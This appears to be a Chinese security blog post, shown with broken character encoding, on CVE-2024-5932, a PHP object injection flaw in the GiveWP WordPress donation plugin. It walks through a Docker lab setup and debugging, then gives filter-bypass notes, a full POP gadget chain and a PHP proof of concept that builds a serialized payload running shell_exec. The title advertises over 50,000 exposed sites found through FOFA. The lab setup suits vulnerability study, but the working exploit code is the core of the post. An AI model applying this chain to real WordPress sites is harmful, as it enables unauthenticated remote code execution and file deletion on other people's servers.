#  è¶…é«˜å± Wordpress RCEæ¼æ´ž CVE-2024-5932 å…¨ç½‘èµ„äº§ 5W+ é™„POC   
åˆè§„æ¸—é€  åˆè§„æ¸—é€   2024-09-05 20:05  
  
pocè§æœ€ä¸‹æ–¹é˜…è¯»åŽŸæ–‡ï¼Œæ¬¢è¿Žå…³æ³¨ã€‚æœ€æ–°æ¼æ´žæŒç»­æŽ¨é€ä¸­  
  
CVE-2024-5932ï¼šGiveWP PHP å¯¹è±¡æ³¨å…¥æ¼æ´žæ˜¯ä¸€ä¸ªå¯ä»¥  
è¿œç¨‹ä»£ç æ‰§è¡Œå’Œæœªç»æŽˆæƒæ–‡ä»¶åˆ é™¤çš„æ¼æ´ž  
  
**æ¼æ´žæè¿°ï¼š**  
  
WordPress çš„ GiveWP æèµ æ’ä»¶å’Œç­¹æ¬¾å¹³å°æ’ä»¶åœ¨ 3.14.1 åŠä¹‹å‰çš„æ‰€æœ‰ç‰ˆæœ¬ä¸­ï¼Œé€šè¿‡ååºåˆ—åŒ–æ¥è‡ªâ€œgive_titleâ€çš„ä¸å—ä¿¡ä»»çš„è¾“å…¥ï¼Œå®¹æ˜“å—åˆ° PHP å¯¹è±¡æ³¨å…¥çš„æ”»å‡»ã€‚' èŒƒå›´ã€‚è¿™ä½¿å¾—æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥æ³¨å…¥ PHP å¯¹è±¡ã€‚POP é“¾çš„é¢å¤–å­˜åœ¨å…è®¸æ”»å‡»è€…è¿œç¨‹æ‰§è¡Œä»£ç å¹¶åˆ é™¤ä»»æ„æ–‡ä»¶ã€‚  
  
CVE-2024-5932.py  
  
![](https://mmbiz.qpic.cn/mmbiz_png/vZZfNxKcwj42Ce815MG9ia76vp75xLtrxor3yRh9zMwhEqUtQzq2fT6IMk9vsdC5ibicJGJicFVIsCzDogrjEx5WZQ/640?wx_fmt=png&from=appmsg "")  
æ ¹æ®ç‰¹å¾ä»Žfofaæœç´¢å¯å¾—åˆ°5W+èµ„äº§  
![](https://mmbiz.qpic.cn/mmbiz_png/vZZfNxKcwj42Ce815MG9ia76vp75xLtrxiagGNwKYlfymRMt5DYNB8NTFsUS3pZBACBibqcpOqdFhibDia31F3E5uZA/640?wx_fmt=png&from=appmsg "")  
##   
## æ¼æ´žå¤çŽ°çŽ¯å¢ƒæ­å»º  
### 1. docker-compose.ymlÂ 1.docker-compose.yml  
```
services:
  db:
    image: mysql:8.0.27
    command: '--default-authentication-plugin=mysql_native_password'
    restart: always
    environment:
      - MYSQL_ROOT_PASSWORD=somewordpress
      - MYSQL_DATABASE=wordpress
      - MYSQL_USER=wordpress
      - MYSQL_PASSWORD=wordpress
    expose:
      - 3306
      - 33060
  wordpress:
    image: wordpress:6.3.2
    ports:
      - 80:80
    restart: always
    environment:
      - WORDPRESS_DB_HOST=db
      - WORDPRESS_DB_USER=wordpress
      - WORDPRESS_DB_PASSWORD=wordpress
      - WORDPRESS_DB_NAME=wordpress
volumes:
  db_data:
```  
### 2.ç„¶åŽä¸‹è½½æœ‰æ¼æ´žçš„GiveWPæ’ä»¶ï¼š  
  
https://downloads.wordpress.org/plugin/give.3.14.1.zip  
### 3. è§£åŽ‹ GiveWP æ’ä»¶ zip æ–‡ä»¶å¹¶å°†æ•´ä¸ªæ–‡ä»¶å¤åˆ¶åˆ°â€œ/var/www/html/wp-content/pluginsâ€ç›®å½•ã€‚  
```
dockerÂ cpÂ giveÂ docker-wordpress-1:/var/www/html/wp-content/plugins
```  
```
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/vZZfNxKcwj42Ce815MG9ia76vp75xLtrxNjX6fwn5KV7j46yapKKSVOvlQicLtkxoHxvtOmqucpomjSFqx2DKPUw/640?wx_fmt=png&from=appmsg "")  
### 5. ä½¿ç”¨ GiveWP æ’ä»¶æ·»åŠ æ–°å¸–å­å¹¶å¤åˆ¶å¸–å­é“¾æŽ¥  
![](https://mmbiz.qpic.cn/mmbiz_png/vZZfNxKcwj42Ce815MG9ia76vp75xLtrx7m7iaibbOibJzduz6vu4tSUh7iaiatYerYJBawjW1pu0FsoWVECmlqYKKLg/640?wx_fmt=png&from=appmsg "")  
### 6.æ£€æŸ¥æ˜“å—æ”»å‡»çš„é“¾æŽ¥  
  
![](https://mmbiz.qpic.cn/mmbiz_png/vZZfNxKcwj42Ce815MG9ia76vp75xLtrxDKcYcbpRFj7BYfNna5Zm8qXdaubE2I6icPhoIBejAlXrssianiaTkw6qg/640?wx_fmt=png&from=appmsg "")  
### åœ¨dockerçŽ¯å¢ƒä¸­è®¾ç½®ç›®æ ‡æ–‡ä»¶  
  
é¦–å…ˆï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è®¿é—® wordpress shellï¼š  
```
docker exec -it -u root docker-wordpress-1 /bin/bash
```  
  
å¦‚æžœè¯¥æ–‡ä»¶å±žäºŽrootï¼Œåˆ™å¯èƒ½ç”±äºŽæƒé™åŽŸå› è€Œæ— æ³•åˆ é™¤ã€‚å› æ­¤ï¼Œæ‚¨éœ€è¦ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ›´æ”¹æµ‹è¯•æ–‡ä»¶çš„æ‰€æœ‰æƒï¼š  
```
touch test && chown www-data test
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/vZZfNxKcwj42Ce815MG9ia76vp75xLtrx4r4EhfnwdibcGQfnfRscZzSsvdaKfqoSq3UhvHI3g8jZDGwXPPjgggg/640?wx_fmt=png&from=appmsg "")  
## é€šè¿‡ PHPSTORM è¿›è¡Œè°ƒè¯•  
  
æ‚¨å¯ä»¥ä½¿ç”¨ PHPSTORM è°ƒè¯• GiveWPã€‚  
### 1. åœ¨ä½ çš„wordpress(Docker)ä¸­ä¸‹è½½xdebugï¼š  
```
pecl install xdebug
```  
### 2.ç„¶åŽåƒ(Docker)ä¸€æ ·è®¾ç½®wordpressçš„php.iniæ–‡ä»¶ï¼š  
```
[DEBUG]
zend_extension=/usr/local/lib/php/extensions/no-debug-non-zts-20200930/xdebug.so
xdebug.mode=debug
xdebug.start_with_request=trigger
xdebug.remote_enable=on
xdebug.remote_handler=dbgp
xdebug.client_host={your_PHPSTORM_address}
xdebug.client_port={your_PHPSTORM_debugging_port}
xdebug.idekey=PHPSTORM
xdebug.profiler_enable_trigger=1
xdebug.trace_enable_trigger=1
```  
  
..ç„¶åŽä½ å°±å¯ä»¥è°ƒè¯•ä½ çš„wordpressäº†ã€‚  
### 3. è®¾ç½®PHPSTORMï¼ˆæœ¬åœ°ï¼‰ï¼š  
  
![](https://mmbiz.qpic.cn/mmbiz_png/vZZfNxKcwj42Ce815MG9ia76vp75xLtrx285msNYyddmQPH3XGoqXVKe4qor3umwgKkFzWtqrBoicm6Q4yGIACXA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/vZZfNxKcwj42Ce815MG9ia76vp75xLtrxTePDeYXPtkGh2KKIeuNeVb8Xd9Xqha3iaCA31rkicI6jvfvawdMibV0Aw/640?wx_fmt=png&from=appmsg "")  
### 4. PHPSTORMç¤ºä¾‹ï¼ˆä¾‹å¦‚TCPDFä»»æ„æ–‡ä»¶åˆ é™¤ï¼‰  
  
![](https://mmbiz.qpic.cn/mmbiz_png/vZZfNxKcwj42Ce815MG9ia76vp75xLtrxuickImUlwZqISicJY9Iug1kzCYQkH78GBicNib5s1P8VibQALzwvRxRymYA/640?wx_fmt=png&from=appmsg "")  
# åˆ†æž  
## è„†å¼±ç‚¹ï¼ˆincludes/ payments/class-give- payment.phpï¼‰  
  
æ­¤æ—¶ï¼Œget_meta()å‡½æ•°ååºåˆ—åŒ–ä¹‹å‰ä¿å­˜çš„â€œgive_titleâ€å€¼ã€‚  
```
switch ( $key ) {
            case 'title':
              $user_info[ $key ] = Give()->donor_meta->get_meta( $donor->id, '_give_donor_title_prefix', true );
              break;
...
```  
## Bypass æŠ€æœ¯  
  
```
strip_tags: replace nullbytes -> using \0
strip_tagsï¼šä½¿ç”¨ \0 æ›¿æ¢ç©ºå­—èŠ‚ ->
stripslashes_deep: replace backslashes -> using \\\\
stripslashes_deepï¼šä½¿ç”¨ \\\\ æ›¿æ¢åæ–œæ  ->
```  
  
****## POP chaining for RCEÂ RCE çš„ POP é“¾  
  
```
Stripe\StripeObject->__toString()
Stripe\StripeObject->toArray()
Give\PaymentGateways\DataTransferObjects\GiveInsertPaymentData->toArray()
Give\PaymentGateways\DataTransferObjects\GiveInsertPaymentData->getLegacyBillingAddress()
Give->__get('address1')
ç»™->__get('address1')
\Give\Vendors\Faker\ValidGenerator->get('address1')
\Give\Vendors\Faker\ValidGenerator->get('address1')
\Give\Vendors\Faker\ValidGenerator->__call('get', 'address1')
\Give\Vendors\Faker\ValidGenerator->__call('get', 'address1')
Give\Onboarding\SettingsRepository->get('address1') (Return command string)
Give\Onboarding\SettingsRepository->get('address1')ï¼ˆè¿”å›žå‘½ä»¤å­—ç¬¦ä¸²ï¼‰
call_user_func('shell_exec', 'command')
call_user_func('shell_exec', 'å‘½ä»¤')
PoC.php
<?php
namespace Stripe{
  class StripeObject
  {
    protected $_values;
    public function __construct(){
      $this->_values['foo'] = new \Give\PaymentGateways\DataTransferObjects\GiveInsertPaymentData();
    }
  }
}

namespace Give\PaymentGateways\DataTransferObjects{
  class GiveInsertPaymentData{
    public $userInfo;
    public function __construct()
{
        $this->userInfo['address'] = new \Give();
    } 
  }
}  

namespace{
  class Give{
    protected $container;
    public function __construct()
{
      $this->container = new \Give\Vendors\Faker\ValidGenerator();
    }
  }
}

namespace Give\Vendors\Faker{
  class ValidGenerator{
    protected $validator;
    protected $generator;
    public function __construct()
{
      $this->validator = "shell_exec";
      $this->generator = new \Give\Onboarding\SettingsRepository();
    }
  }
}

namespace Give\Onboarding{
  class SettingsRepository{
    protected $settings;
    public function __construct()
{
      $this -> settings['address1'] = 'touch /tmp/EQSTtest';
    }
  }
}

namespace{
  $a = new Stripe\StripeObject();
  echo serialize($a);
}
```  
# é€šè¿‡ POP é“¾è¿›è¡Œè¿œç¨‹å‘½ä»¤æ‰§è¡ŒÂ   
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/vZZfNxKcwj42Ce815MG9ia76vp75xLtrxfic2DBg5doqRicEP1nIFPfLFdTZfLGvTagHK8TDNt1cl29Erbk3Yedbg/640?wx_fmt=png&from=appmsg "")  
  
  
ðŸ‘‡ poc  
  
